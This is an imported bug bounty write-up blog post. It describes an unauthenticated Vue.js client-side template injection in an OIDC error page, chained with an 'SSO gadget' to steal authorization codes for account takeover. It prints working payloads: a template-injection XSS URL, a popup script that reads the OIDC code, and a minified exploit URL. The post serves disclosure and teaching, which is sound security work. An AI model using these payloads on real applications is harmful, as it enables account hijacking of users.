---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-30_sso-gadgets-ii-unauthenticated-client-side-template-injection-to-account-takeove.md
original_filename: 2023-06-30_sso-gadgets-ii-unauthenticated-client-side-template-injection-to-account-takeove.md
title: 'SSO Gadgets II: Unauthenticated Client-Side Template Injection to Account
  Takeover using SSO Gadget Chain'
category: documents
detected_topics:
- oauth
- sso
- xss
- access-control
- command-injection
- otp
tags:
- imported
- documents
- oauth
- sso
- xss
- access-control
- command-injection
- otp
language: en
raw_sha256: 5b1b4ca60132a8dfeac4de3ab3d1ba43afb72be8265b07aa6eed8dc144d13612
text_sha256: eceb27df82a0cfbe7b04dd47a9f96dfbfb2a4e96cff754338f5946b88b47aaea
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# SSO Gadgets II: Unauthenticated Client-Side Template Injection to Account Takeover using SSO Gadget Chain

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-30_sso-gadgets-ii-unauthenticated-client-side-template-injection-to-account-takeove.md
- Source Type: markdown
- Detected Topics: oauth, sso, xss, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `5b1b4ca60132a8dfeac4de3ab3d1ba43afb72be8265b07aa6eed8dc144d13612`
- Text SHA256: `eceb27df82a0cfbe7b04dd47a9f96dfbfb2a4e96cff754338f5946b88b47aaea`


## Content

---
title: "SSO Gadgets II: Unauthenticated Client-Side Template Injection to Account Takeover using SSO Gadget Chain"
page_title: "(Web-)Insecurity Blog | SSO Gadgets II: Unauthenticated Client-Side Template Injection to Account Takeover using SSO Gadget Chain"
url: "https://security.lauritz-holtmann.de/post/csti-xss-sso-gadget-chain/"
final_url: "https://security.lauritz-holtmann.de/post/csti-xss-sso-gadget-chain/"
authors: ["Lauritz Holtmann (@_lauritz_)"]
bugs: ["CSTI", "Account takeover", "SSO", "OIDC"]
publication_date: "2023-06-30"
added_date: "2023-07-03"
source: "pentester.land/writeups.json"
original_index: 987
---

POSTS June 30, 2023 5 min read 868 words

The following unauthenticated _Client-Side Template Injection_ (CSTI) resulting in a _Cross-Site Scripting_ (XSS) vulnerability was discovered in a private bug bounty program. While the vulnerability could only be exploited in case a user had no active session at the application, chained with an [_SSO gadget_](/post/xss-ato-gadgets/), a malicious actor could have still gained access to the user’s account and performed actions on behalf of the user.

* * *

## Table of Contents

  1. Background
  2. Client-Side Template Injection via `error_description`
  3. SSO Gadget: Weaponizing Unauthenticated Cross-Site Scripting
  4. Remediation
  5. Conclusion

* * *

## Background

The target application implemented multiple login methods, including an SSO solution based on _OpenID Connect_ (OIDC). Standardized within the OIDC specification, there is not only the successful case in which an end-user logs into their account at the _Identity Provider_ (IdP) and is redirected back to the _Relying Party_ (RP) with an _Authorization Code_ (code flow) but also the error case in which the IdP responds with an [Authentication Error Response](https://openid.net/specs/openid-connect-core-1_0.html#AuthError). The specification includes the following non-normative example including an `error_description` parameter:
  
  
  HTTP/1.1 302 Found
  Location: https://client.example.org/cb?
  error=invalid_request
  &error_description=
  Unsupported%20response_type%20value
  &state=af0ifjsldkj
  

Further, the target application made use of the [_Vue.js_](https://vuejs.org/) JavaScript framework. _Vue.js_ supports a [templating syntax](https://vuejs.org/guide/essentials/template-syntax.html) that allows rendering data to the DOM. The following example taken from the documentation shows a simple _Vue.js_ template:
  
  
  <span>Message: {{ msg }}</span>
  

In case a malicious actor can inject arbitrary templates into the application, the actor can execute arbitrary JavaScript code in the context of the application. This is called _Client-Side Template Injection_ (CSTI). If you are not familiar with this vulnerability class, I recommend reading [this blog post](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets) by [Gareth Heyes](https://twitter.com/garethheyes), [Lewis Ardern](https://twitter.com/LewisArdern), and [PwnFunction](https://twitter.com/PwnFunction).

## Client-Side Template Injection via `error_description`

The target application implemented a custom error page for the OIDC error case. The error page was implemented using _Vue.js_ and rendered the `error_description` parameter from the OIDC error response. By passing the payload `{{7*7}}` as the `error_description` parameter, an error message comparable to the following was presented to the end-user:

> Could not authenticate, because **49**.

As the **49** indicates, the provided template was evaluated by the application!

Luckily, achieving XSS from this was [as straightforward as using well-known _Vue.JS_ CSTI gadgets](https://twitter.com/_lauritz_/status/1572658972557033477):  
`https://target.com/callback?error=access_denied&error_description={{"".constructor.constructor("alert(document.domain)")()}}&state=abcdef.`

## SSO Gadget: Weaponizing Unauthenticated Cross-Site Scripting

For now, we have a straight forward XSS vulnerability. But as it is only exploitable in case the end-user has no active session within the application, the impact is very limited.

_But how could we overcome this limitation?_

A few months ago, I published a research post about so-called _[SSO gadgets](/post/xss-ato-gadgets/)_. Back then, I highlighted that these gadgets could be utilized to weaponize self-XSS vulnerabilities. Due to the underlying concept of different sessions at the IdP and the application, this technique can be used to weaponize the aforementioned XSS, too. A simple JavaScript to steal an _OIDC_ code looks like this:
  
  
  // Perform code auth, consent, and active session required
  let exploitWindow = window.open(
  "https://login.microsoftonline.com/common/oauth2/authorize?client_id=REDACTED&redirect_uri=https://target.com/callback&response_mode=query&response_type=code+id_token&nonce=invalid&prompt=none",
  "example",
  "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
  );
  
  // Obtain code 
  // Access to exploitWindow.window.location is only possible from same origin of window (= requires XSS)
  setTimeout(function(){
  alert(exploitWindow.window.location);
  exploitWindow.close()
  },5000);
  

The payload will open a new window to the IdP, which will perform the _OIDC_ code flow. Due to the `prompt=none` parameter, in case the end-user previously consented to the application, the IdP will not prompt the user for authentication and consent.

A minified payload using a CSTI-based XSS could look like this:  
`https://target.com/callback?error=access_denied&state=abcdef&error_description={{"".constructor.constructor("let%20exploitWindow=window.open(%27https://login.microsoftonline.com/common/oauth2/authorize?client_id=REDACTED%26redirect_uri=https://target.com/callback%26response_mode=query%26response_type=code+id_token%26nonce=invalid%26prompt=none%27,%27example%27,%27width=600,height=400,status=yes,scrollbars=yes,resizable=yes%27);setTimeout(()=>alert(exploitWindow.window.location),5000)")()}}`

If an end-user browses to the malicious URL, the following will happen:

  1. JavaScript code is executed in the context of the applicatcion by utilizing the CSTI vulnerability.

  2. The JavaScript code opens a new window to the IdP and performs the _OIDC_ code flow.

  1. In case the end-user has an active session at the IdP and previously used the IdP to sign in, the IdP will immediately redirect the user back to the application with an _OIDC_ code and without prompting for consent (`prompt=none`).
  2. Due to the `response_mode=query` parameter, the _OIDC_ code will be appended to the URL as a query parameter instead of being sent as `form_post` (normal flow used by the application).
  3. The JavaScript code waits for 5 seconds and then alerts the user with the _OIDC_ code from the popup window.

A detailed description of the attack flow can be found in [_Case 2_ of the SSO Gadget post](/post/xss-ato-gadgets/#case-2-confidential-client-oauth-with-code-flow-no-pkce).

## Remediation

The _Vue.JS_ framework has a dedicated documentation page with guidance on how to securely handle user-controlled input: <https://vuejs.org/guide/best-practices/security.html>

## Conclusion

In this post, we discussed a _Client-Side Template Injection_ leading to _unauthenticated Cross-Site Scripting_ , which resulted from insecure handling of standardized _OAuth/OIDC_ parameters within an error case. Further, the unauthenticated vulnerability was escalated using _SSO gadgets_ , to demonstrate the impact by stealing sensitive OAuth/OIDC `code` or `access_token` values.

So, if you encounter an application that implements an SSO solution, make sure to check for the _Authentication Error Response_ and how it is handled. If you find a similar XSS that is only exploitable in case a user has no active session within the application, you may want to check for the possibility to escalate the impact using [_SSO gadgets_](/post/xss-ato-gadgets/).

* * *

Thank you for reading this post! If you have any feedback, feel free to reach out via [Mastodon](https://ruhr.social/@lauritz), [Twitter](https://twitter.com/_lauritz_), or [LinkedIn](https://linkedin.com/in/lauritz-holtmann). 👨‍💻

You can directly tweet about this post using [this link](https://twitter.com/intent/tweet?url=https%3A%2F%2Fsecurity.lauritz-holtmann.de%2Fpost%2Fcsti-xss-sso-gadget-chain%2F&via=_lauritz_). 🤓

  * [Cross-Site Scripting](/tags/cross-site-scripting)
  * [SSO](/tags/sso)
  * [OIDC](/tags/oidc)
  * [OpenID Connect](/tags/openid-connect)
  * [OAuth](/tags/oauth)
